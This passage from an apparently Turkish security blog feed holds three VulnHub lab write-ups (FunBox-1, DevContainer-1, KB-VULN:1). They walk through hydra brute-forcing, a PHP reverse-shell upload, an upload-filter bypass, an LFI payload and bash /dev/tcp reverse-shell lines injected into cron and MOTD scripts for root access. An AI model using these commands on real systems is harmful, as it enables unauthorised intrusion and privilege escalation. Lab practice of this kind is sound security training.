        </item>
        
        <item>
            <title>VULN FunBox-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/</link>
            <pubDate>Tue, 22 Sep 2020 20:59:33 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız&amp;hellip; 😊
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth1  İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/funbox-1,518/">VULNHUB</a> &lsquo;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız&hellip; 😊</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/funbox1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.106
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 07:04 CDT
Nmap scan report for 192.168.56.106 (192.168.56.106)
Host is up (0.00010s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message&quot;
|_    HY000
1 service unrecognized despite returning data. If you know the service/version,
....
MAC Address: 08:00:27:45:D6:F8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.87 seconds
</code></pre>

<div style="text-align:justify;">
<br>
Nmap taramasından görüldüğü gibi site funbox.fritz.box adresine yönlendirilmektedir. İlk olarak /etc/hosts dosyasına <i style="color:yellow;">192.168.56.106  funbox.fritz.box </i>bilgisi eklenir. Daha sonra tarayıcıdan funbox.fritz.box istek atılır. Açılan sayfada footer bölümüne bakıldığında sitenin Wordpress CMS uygulaması olduğu görülmektedir.
<br>
<br>
</div>

    <img src="/images/vulnhub/funbox1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/vulnhub/funbox1/footer.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap taramasında tespit edilen robots.txt dosyasına girilen /secret dizinine gidilir. Dizin içerisinde bir mesaj bırakılmıştır. 😐</p>

    <img src="/images/vulnhub/funbox1/secret.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracı ile web dizin taraması yapılır. Dizin ve alt dizin taramaları sonucunda işe yarar bir bilgi edinilememiştir. 😕</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://funbox.fritz.box/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
</code></pre></div>
    <img src="/images/vulnhub/funbox1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Wordpress&rsquo;e özel araç olan <strong>wpscan</strong> ile tarama gerçeleştirilir. Admin paneli, kullanıcı adları ve parola bilgileri elde edinilmeye çalışılır. Tarama sonucunda <em>admin</em> ve <em>joe</em> adında iki kullanıcı adı tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://funbox.fritz.box/ --enumerate
</code></pre></div>
    <img src="/images/vulnhub/funbox1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Elde edinilen kullanıcı adları ile ssh ve ftp servislerine hydra aracı ile brute force saldırısı yapılır. Her iki serviste de saldırı sonucunda <strong>joe</strong> kullanıcısına ait parola bilgisi elde edilir. Bu aşamadan sonra ftp portundan devam edilmektedir. (Ssh servisine saldırmak sonradan aklıma geldi 🥺) Ssh bağlantısı alınarak da devam edilebilmektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.106
</code></pre>
    <img src="/images/vulnhub/funbox1/ftp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.106
</code></pre>
    <img src="/images/vulnhub/funbox1/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Ftp servisine bağlanılır. Shell almak için web uygulamasının yer aldığı <em><strong>/var/www/html</strong></em> dizini geçilir, reverse shell almak için <strong>joe</strong> kullanıcısı yetkilerinde olan secret klasörüne dosya yüklenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp 192.168.56.106
</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Connected to 192.168.56.106.
220 ProFTPD Server (Debian) [::ffff:192.168.56.106]
Name (192.168.56.106:barcode): joe
331 Password required for joe
Password:
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; cd /var/www/html
250 CWD command successful
ftp&gt; ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 .
drwxr-xr-x   4 root     root         4096 Jun 19 11:18 ..
-rwxrwxrwx   1 www-data www-data    10918 Jun 19 11:16 default.htm
-rwxrwxrwx   1 www-data www-data      405 Jul 17 16:02 index.php
-rwxrwxrwx   1 www-data www-data    19915 Jul 17 16:02 license.txt
-rwxrwxrwx   1 www-data www-data     7278 Jul 17 16:02 readme.html
-rw-rw-r--   1 joe      joe            19 Jul 18 10:12 robots.txt
drwxrwxr-x   2 joe      joe          4096 Jul 18 10:05 secret
-rwxrwxrwx   1 www-data www-data     6912 Jul 17 16:02 wp-activate.php
drwxrwxrwx   9 www-data www-data     4096 Jul 17 16:02 wp-admin
-rwxrwxrwx   1 www-data www-data      351 Jul 17 16:02 wp-blog-header.php
-rwxrwxrwx   1 www-data www-data     2332 Jul 17 16:02 wp-comments-post.php
-rwxrwxrwx   1 www-data www-data     3047 Jun 19 11:28 wp-config.php
-rwxrwxrwx   1 www-data www-data     2913 Jul 17 16:02 wp-config-sample.php
drwxrwxrwx   6 www-data www-data     4096 Jul 18 08:44 wp-content
-rwxrwxrwx   1 www-data www-data     3940 Jul 17 16:02 wp-cron.php
drwxrwxrwx  21 www-data www-data    12288 Jul 17 16:02 wp-includes
-rwxrwxrwx   1 www-data www-data     2496 Jul 17 16:02 wp-links-opml.php
-rwxrwxrwx   1 www-data www-data     3300 Jul 17 16:02 wp-load.php
-rwxrwxrwx   1 www-data www-data    47874 Jul 17 16:02 wp-login.php
-rwxrwxrwx   1 www-data www-data     8509 Jul 17 16:02 wp-mail.php
-rwxrwxrwx   1 www-data www-data    19396 Jul 17 16:02 wp-settings.php
-rwxrwxrwx   1 www-data www-data    31111 Jul 17 16:02 wp-signup.php
-rwxrwxrwx   1 www-data www-data     4755 Jul 17 16:02 wp-trackback.php
-rwxrwxrwx   1 www-data www-data     3133 Jul 17 16:02 xmlrpc.php
226 Transfer complete
ftp&gt; cd secret
250 CWD command successful
ftp&gt; put reverse.php
local: reverse.php remote: reverse.php
200 PORT command successful
150 Opening BINARY mode data connection for reverse.php
226 Transfer complete
3475 bytes sent in 0.00 secs (11.3494 MB/s)
ftp&gt; ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 joe      joe          4096 Sep 22 13:59 .
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 ..
-rw-rw-r--   1 joe      joe            30 Jul 18 10:05 index.html
-rw-r--r--   1 joe      joe          3475 Sep -22 13:59 reverse.php
226 Transfer complete
</code></pre><p>Netcat ile 4444 numaralı port dinlenmeye başlanır ve tarayıcından <a href="http://funbox.fritz.box/secret/reverse.php">http://funbox.fritz.box/secret/reverse.php</a> istek atılırak terminal bağlantısı sağlanır.</p>

    <img src="/images/vulnhub/funbox1/firstac.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>www-data kullanısından <code>su joe </code> komutu ve ftp servisinde kullanılan parola bilgisi kullanılarak joe kullanıcısına yetki yükseltilir.</p>

    <img src="/images/vulnhub/funbox1/firstpriv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Home dizinine geçilerek diğer kullanıcılara bakıldığında <strong>funny</strong> kullanısına ait klasör görülmektedir. Klasör joe kullanıcısını erişime açıktır. Klasör içeriği listelenir.</p>

    <img src="/images/vulnhub/funbox1/funnyhome.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Dizinde yer alan sh uzantılı dosyalar görüntülenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat .backup.sh 
<span style="color:#75715e">#!/bin/bash</span>
tar -cf /home/funny/html.tar /var/www/html

cat .reminder.sh 
<span style="color:#75715e">#!/bin/bash</span>
echo <span style="color:#e6db74">&#34;Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.&#34;</span> | mail -s<span style="color:#e6db74">&#34;Reminder&#34;</span> joe@funbox
</code></pre></div><p><strong>.backup.sh</strong> dosyası web dizininde yer alan dosyaların yedeklerini almaktadır. Sistem hakkında daha fazla bilgi toplamak için <a href="https://github.com/rebootuser/LinEnum">LinEnum Betiği</a> kullanılır. Sonuçlar incelendiğinde .backup.sh dosyasının funny kullanıcısının cron görevi olduğu görülmektedir.</p>

    <img src="/images/vulnhub/funbox1/cron.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ayrıca funny kullanıcısının yüksek yetkili kullanıcı olduğu tespit edilmektedir.</p>

    <img src="/images/vulnhub/funbox1/yetki.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Sistemde çalışan cron servisinin hangi kullanıcı yetkisinde çalıştığı incelenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps aux | grep cron
</code></pre></div>
    <img src="/images/vulnhub/funbox1/ps.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Cron uygulaması root yetkisinde çalışmaktadır. .backup.sh dosyası içeriğinde yer alan komutlar funny kullanıcısının ile çalışacaktır. Funny kullanıcısı sudo yetkisine sahiptir. Bu nedenle komutlar sudo ile verildiğinde root  yetkisinde çalışmaktadır. Dosya aşağıdaki gibi düzenlenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;sudo bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.105/7776 &lt;&amp;1&#39;&#34;</span> &gt; .backup.sh
</code></pre></div><p>nc ile 7776 numaralı port dinlenir ve kısa bir süre otomatik bağlantı gerçekleşmektedir. Root dizini altındaki flag değerine ulaşılarak çözümleme tamamlanır.</p>
<p>
    <img src="/images/vulnhub/funbox1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">Yetki yükseltme aşaması biraz zaman alsa da çözülmeye değer bir makinaydı. 🤗
</div>

    <img src="/images/vulnhub/funbox1/finally.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>VULN DevContainer-1 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/</link>
            <pubDate>Mon, 21 Sep 2020 22:53:05 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-devcontainer-1-write-up/</guid>
            <description>&amp;ldquo;Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;&amp;rdquo;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.  netdiscover -i eth1  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
Tarayıcı ile web servisine istek atılır.</description>
            <content type="html"><![CDATA[<p>&ldquo;Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/devcontainer-1,548/">VULNHUB</a> &lsquo;da yer alan medium seviye DevContainer-1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;&rdquo;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>


<div style="text-align:justify;">
Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/devcontainer1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
Tarayıcı ile web servisine istek atılır. Açılan sayfa ve kaynak kodları incelendiğinde olağan dışı bir bilgiye görülmemektedir.
<br>
<br>
</div>

    <img src="/images/vulnhub/devcontainer1/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Gobuster aracı ile Web dizin taraması gerçekleştirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.104/ -w /usr/share/wordlists/dirb/big.txt 
</code></pre></div>
    <img src="/images/vulnhub/devcontainer1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Upload</strong> dizini dikkat çekmektedir. Tarayıcıdan istek atıldığında upload sayfası karşılamaktadır. İzin verilen dosya uzantıları ekranda yazılmaktadır.</p>

    <img src="/images/vulnhub/devcontainer1/upload.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Burpsuite uygulaması açılır ve normal bir resim dosyası yüklendiğinde giden istek incelenir.</p>

    <img src="/images/vulnhub/devcontainer1/normal.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Php uzantılı dosya yüklendiğinde giden isteğin <em><strong>Content-type</strong></em> değeri <em><strong>image/gif</strong></em> şeklinde değiştirilerek deneme yapılır. Yükleme işlemi başarılı bir şekilde gerçekleşmektedir.</p>

    <img src="/images/vulnhub/devcontainer1/son.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>İlgili port dinlenmeye alınarak upload ekranında yer alan index yazısına tıklanarak yüklenen dosya çağırılır ve reverse shell alınır.</p>

    <img src="/images/vulnhub/devcontainer1/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/etc/passwd</strong></em> dosyası görüntülenerek sistemdeki kullanılar tespit edilir. Login olabilecek kullanıcı gözükmemektedir. Bu durumda bir container içerisinde olduğumuz tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/etc.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Web uygulamasının çalıştığı <em><strong>/var/www/html</strong></em> dizine geçilir.</p>

    <img src="/images/vulnhub/devcontainer1/dizin.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Maintenance-Web-Docker</strong> dizini dikkat çekmektedir. Dizine girilerek içerisinde yer alan alan dosyalar incelenir.</p>

    <img src="/images/vulnhub/devcontainer1/webdocker.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<pre><code class="language-terminal" data-lang="terminal">cat maintenance.sh

#!/bin/bash
#Version 1.0
#This script monitors the uploaded files. It is a reverse shell monitoring measure.
#path= /home/richard/web/webapp/upload/files/
/home/richard/web/Maintenance-Web-Docker/list.sh


cat list.sh

#!/bin/bash
date &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
ls /home/richard/web/upload/files/ | wc -l &gt;&gt; /home/richard/web/Maintenance-Web-Docker/out.txt
</code></pre><p>Dockerda yer alan <strong>www</strong> dizini ile <strong>/home/richard/web/</strong> dizini birbirine volume oluşturularak bağlanmıştır. List.sh dosyası shell alınacak şekilde düzenir ve çalıştırılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -i &amp;&gt;/dev/tcp/192.168.56.105/7777 0&gt;&amp;1&#34;</span> &gt; list.sh
</code></pre></div><p>7777 numaralı port dinlenir ve bağlantı sağlanır.</p>

    <img src="/images/vulnhub/devcontainer1/rev.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>User.txt dosyası okunarak ilk aşama tamamlanır.</p>

    <img src="/images/vulnhub/devcontainer1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Sudo -l komutu ile yetkiler kontrol edilir.</p>

    <img src="/images/vulnhub/devcontainer1/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Parola gerektirmeden root yetkisi ile socat uygulamasının çalıştırılabildiği görülmektedir. <strong>TCP-LISTEN 8080</strong> ile 8080 portuna gelen bağlantılar dinlenir, <strong>fork</strong> ile gelen bağlantılar 90 portuna yönlendirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u root /home/richard/HackTools/socat TCP-LISTEN<span style="color:#ae81ff">\:</span>8080<span style="color:#ae81ff">\,</span>fork TCP<span style="color:#ae81ff">\:</span>127.0.0.1<span style="color:#ae81ff">\:</span><span style="color:#ae81ff">90</span>
</code></pre></div><p>Komut çalıştırıldığında 8080 portu gelen bağlantılar için dinlenmeye başlanır. Tarayıcıdan <em>http://makianaipsi:8080</em> istek atıldığında web sayfası açılır.</p>

    <img src="/images/vulnhub/devcontainer1/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Sayfada yer alan linklere tıklandığında lfi açığı olabileceği tespit edilir.</p>

    <img src="/images/vulnhub/devcontainer1/lfi.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>view=../../../../../../etc/passwd</strong></em> parametre girilerek lfi açığı varlığı tespit edilir. Görüldüğü gibi include işlemi başarılı gerçekleşmiş ve passwd dosyası okunmuştur.</p>

    <img src="/images/vulnhub/devcontainer1/passwd.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>İlk etapta upload ettiğimiz shell dosyası <strong>../upload/files</strong> klasörü altındadır. O dosya tekrar çağırılarak bağlantı alınır.</p>

    <img src="/images/vulnhub/devcontainer1/shell2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>/root dizinine geçilir ve dizin listenir ve çözüm tamamlanır.</p>

    <img src="/images/vulnhub/devcontainer1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULNHUB KB VULN:1 Makinası Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</link>
            <pubDate>Thu, 17 Sep 2020 20:40:54 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vulnhub-kb-vuln1-makinas%C4%B1-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.  netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">VULNHUB</a> &lsquo;da yer alan medium seviye KB-VULN: 1 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>


<div style="text-align:justify;">
Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
</div>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln1/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Ftp portunda çalışan servisin konfigürasyon ayarları varsayılan olarak bırakıldığı için anonymous erişim açıktır. Ftp servisine bağlanılır ve paylaşıma açık dosyalar incelenir.
</div>

    <img src="/images/vulnhub/kb-vuln1/ftp1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
<p><strong>.bash_history</strong> adlı dosya bilgisayara indirilir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/ftp2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
İndirilen dosyanın içeriğine bakıldığından ssh vb. erişimlerde kullanıcıya verilen karşılama mesajının (Günün Mesajı-Message Of The Day(motd)) yer aldığı <i style="color:yellow"> <strong> 00-header </strong></i> dosyasında değişiklik yapıldığı görülmektedir. Yetki yükseltme aşamasında kullanılabilir.
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/file.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Tarayıcı ile web servisine istek atılır. Oneschool adlı bir web sayfası açılmaktadır. Sayfa kaynak kodları incelendiğinde bir kullanıcı adı tespit edilmektedir.</p>
<p>
    <img src="/images/vulnhub/kb-vuln1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
<br>
</div>

    <img src="/images/vulnhub/kb-vuln1/websource.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />




<div style="text-align:justify;">
Web dizininde gobuser ile dizin taraması gerçekleştirilir. Yapılan dizin ve alt dizin taramalarında ilk erişim için parola yada giriş paneli tespit edilememiştir. Elde edilen kullanıcı adı ile hydra aracı ile ssh servisine brute force saldırı yapılır.
</div></p>
<pre><code class="language-terminal" data-lang="terminal">hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
</code></pre>
    <img src="/images/vulnhub/kb-vuln1/hydra.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<p>Elde edilen parola ile ssh erişimi sağlanır.</p>
<pre><code class="language-terminal" data-lang="terminal">[barcode@parrot]─[~]$ ssh sysadmin@192.168.56.102
The authenticity of host '192.168.56.102 (192.168.56.102)' can't be established.
ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.102' (ECDSA) to the list of known hosts.
sysadmin@192.168.56.102's password: 

			WELCOME TO THE KB-SERVER

Last login: Sat Aug 22 18:00:48 2020
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
See &quot;man sudo_root&quot; for details.

sysadmin@kb-server:~$
</code></pre><p>sysadmin kullanıcısına ait home dizininde yer alan dosyalar listelenir ve user.txt dosyası okunarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/kb-vuln1/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>İlk olarak <em><strong>/etc/update-motd.d/</strong></em> dizinine gidilir ve 00-header dosyasının izinleri kontrol edilir.</p>
<pre><code class="language-terminal" data-lang="terminal">sysadmin@kb-server:~$ cd /etc/update-motd.d/
sysadmin@kb-server:/etc/update-motd.d$ ls -lsa
total 16
4 drwxr-xr-x  3 root root 4096 Aug 22 17:08 .
4 drwxr-xr-x 92 root root 4096 Sep 11 08:24 ..
4 -rwxrwxrwx  1 root root  989 Aug 22 17:08 00-header
4 drwxr-xr-x  2 root root 4096 Aug 22 17:07 other
</code></pre><p>00-header dosyasında tüm kullanıcılara yazma yetkisi verildiği görülmektedir. Normal kullanımda bu yetki sadece root yetkisinde olmaktadır. Dosya içeriği görüntülenir.</p>

    <img src="/images/vulnhub/kb-vuln1/header1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ssh erişiminde çalışan dosyanın hangi kullanıcı yetkisi ile çalıştırıldığının tespiti için whoami komutu eklenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;whoami&#34;</span> &gt;&gt; 00-header
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sysadmin@kb-server:/etc/update-motd.d$ cat 00-header 
<span style="color:#75715e">#!/bin/sh</span>
#
<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
#
<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
#
<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
<span style="color:#75715e">#    (at your option) any later version.</span>
#
<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#75715e">#    GNU General Public License for more details.</span>
#
<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release

